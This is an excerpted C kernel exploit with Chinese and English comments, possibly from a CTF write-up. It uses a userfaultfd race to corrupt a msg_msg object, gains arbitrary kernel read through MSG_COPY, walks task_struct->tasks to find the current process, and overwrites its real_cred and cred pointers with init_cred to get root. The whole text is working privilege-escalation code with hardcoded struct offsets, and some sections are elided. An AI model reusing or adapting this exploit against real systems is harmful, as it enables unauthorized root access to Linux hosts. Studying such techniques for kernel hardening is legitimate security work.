...
void *handler(void *arg) {
  ...
  if (nready !=
      1) // 这会一直等待，直到copy_from_user/copy_to_user访问FAULT_PAGE
    errExit("[-] Wrong pool return value");
  printf("[+] Trigger! I'm going to hang\n");

  if (read(uffd, &msg1, sizeof(msg1)) !=
      sizeof(msg1)) // 从uffd读取msg结构，虽然没用
    errExit("[-] Error in reading uffd_msg");
  assert(msg1.event == UFFD_EVENT_PAGEFAULT);
  printf("[+] fault page handler finished\n");
  // 1. change msg_msg->m_ts and msg_msg->next,      msg_msg->next =
  // &task_struct->real_cred - 0x8
  ...
  memcpy((void *)(buffer + 0x1000 - 0x30), (void *)&init_cred,
         8); // msg_msg: 0xfd0  -  real_cred
  memcpy((void *)(buffer + 0x1000 - 0x30 + 8), (void *)&init_cred,
         8); // msg_msg: 0xfd8  -  cred

  uc.src = (unsigned long)buffer;
  uc.dst =
      (unsigned long)race_page; // (unsigned long) msg1.arg.pagefault.address &
                                // ~(page_size - 1);
  uc.len = 0x1000;
  uc.mode = 0;
  uc.copy = 0;
...
void register_userfault(uint64_t fault_page, uint64_t fault_page_len,
  ...
  uint64_t uffd = syscall(__NR_userfaultfd,
                          O_CLOEXEC | O_NONBLOCK); // create the user fault fd
  ua.api = UFFD_API;
  ua.features = 0;
  if (ioctl(uffd, UFFDIO_API, &ua) == -1)
    errExit("[-] ioctl-UFFDIO_API");
  // if (mmap(fault_page, fault_page_len, 7, 0x22, -1, 0) != fault_page) //
  // PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,  //create page used
  // for user fault
  ...
  if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
    errExit(
        "[-] ioctl-UFFDIO_REGISTER"); //注册页地址与错误处理fd，这样只要copy_from_user
                                      //访问到FAULT_PAGE，则访问被挂起，uffd会接收到信号
  int s = pthread_create(&thr, NULL, handler,
                         (void *)uffd); // handler函数进行访存错误处理
  if (s != 0)
...
int main() {
  ...
  // 2. use arb read to traverse task_struct->tasks (at 0x298), find current
  // task_struct via task_struct->pid (at 0x398)
  int32_t pid, cur_pid;
  int64_t prev, curr;
  cur_pid = getpid();
  ...
  while (pid != cur_pid) {
    ...
    msgrcv(qid, received, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
    memcpy((void *)&prev, (void *)(received + 0xfe0),
           8); // 0xfd0 + 0x10        msg_msgseg: null + tasks.next + tasks.prev
    memcpy((void *)&pid, (void *)(received + 0x10d8),
           4); // 0xfd0 + 0x8 + (0x398 - 0x298)
    printf("%d\n", pid);
  }
  ...
  msg *rooter;
  void *evil_page = mmap(NULL, 4 * page_size, PROT_READ | PROT_WRITE,
  ...
  msgsnd(qid, rooter, size - 0x30,
         0); // memory layout:   0xfd0 + 0x10  ->  kmalloc-4096 + kmalloc-32
